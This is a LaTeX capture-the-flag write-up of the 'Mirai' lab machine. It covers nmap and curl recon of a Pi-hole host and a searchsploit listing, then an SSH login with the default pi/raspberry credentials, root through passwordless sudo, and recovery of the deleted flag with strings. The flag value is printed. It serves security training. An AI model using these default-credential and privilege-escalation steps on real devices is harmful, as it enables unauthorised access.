\chapter{Mirai}
\begin{itemize}
    \item {\bf technics}: forensics deleted file 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.10.48
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
|   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
|   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
|_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1957/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-favicon: Plex
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}


\subsection{http}
\begin{verbatim}
$ curl -i http://10.10.10.48
HTTP/1.1 404 Not Found
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Content-Length: 0
Date: Thu, 19 Jan 2023 13:05:50 GMT
Server: lighttpd/1.4.35

\end{verbatim}

\url{https://github.com/pi-hole/pi-hole}

\begin{verbatim}
$ curl -I http://10.10.10.48/admin/ -H 'Host: pi.hole'
HTTP/1.1 200 OK
X-Pi-hole: The Pi-hole Web interface is working!
X-Frame-Options: DENY
Set-Cookie: PHPSESSID=1fpbk0u1uth1v0eqund4smrfp1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Date: Thu, 19 Jan 2023 13:15:01 GMT
Server: lighttpd/1.4.35

\end{verbatim}

\begin{verbatim}
$ searchsploit pi hole

------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
GNU Beep 1.3 - 'HoleyBeep' Local Privilege Escalation                         | linux/local/44452.py
Pi-hole 4.3.2 - Remote Code Execution (Authenticated)                         | python/webapps/48727.py
Pi-hole 4.4.0 - Remote Code Execution (Authenticated)                         | linux/webapps/48519.py
Pi-hole < 4.4 - Authenticated Remote Code Execution                           | linux/webapps/48442.py
Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation   | linux/webapps/48443.py
Pi-Hole - heisenbergCompensator Blocklist OS Command Execution (Metasploit)   | php/remote/48491.rb
Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting in Whitelist/Bl | linux/webapps/40249.txt
------------------------------------------------------------------------------ ---------------------------
\end{verbatim}


\begin{verbatim}
$ curl -I http://10.10.10.48/admin/api.php -H 'Host: pi.hole'
HTTP/1.1 200 OK
X-Pi-hole: The Pi-hole Web interface is working!
X-Frame-Options: DENY
Content-type: application/json
Set-Cookie: PHPSESSID=ut0ts3h16cklhfupjddrdfve05; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Date: Thu, 19 Jan 2023 13:18:00 GMT
Server: lighttpd/1.4.35
\end{verbatim}


\begin{verbatim}
$ curl -i http://pie.hole
...SNIP...
<footer>Generated Thu 1:19 PM, Jan 19 by Pi-hole v3.1.4</footer>
\end{verbatim}

\begin{verbatim}
in Raspberry OS, the default username is “pi” and the default password:
“raspberry“. However, other distributions have their default usernames and
passwords that are not similar …
\end{verbatim}


\begin{verbatim}
$ ssh pi@pie.hole
The authenticity of host 'pie.hole (10.10.10.48)' can't be established.
pi@pie.hole's password:

pi@raspberrypi:~$
$ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~$ sudo bash
root@raspberrypi:/home/pi# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
# lsblk
...SNIP...
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
# ls /media/usbstick/
damnit.txt  lost+found
root@raspberrypi:/home/pi# cat /media/usbstick/damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/home/pi# ls /media/usbstick/lost+found/
root@raspberrypi:/home/pi# strings /dev/sdb
...SNIP...
3d3e483143ff12ec505d026fa13e020b
\end{verbatim}

on peut aussi utiliser dd pour copier \verb+/dev/sdb+ puis un testdisk sur le
fichier.
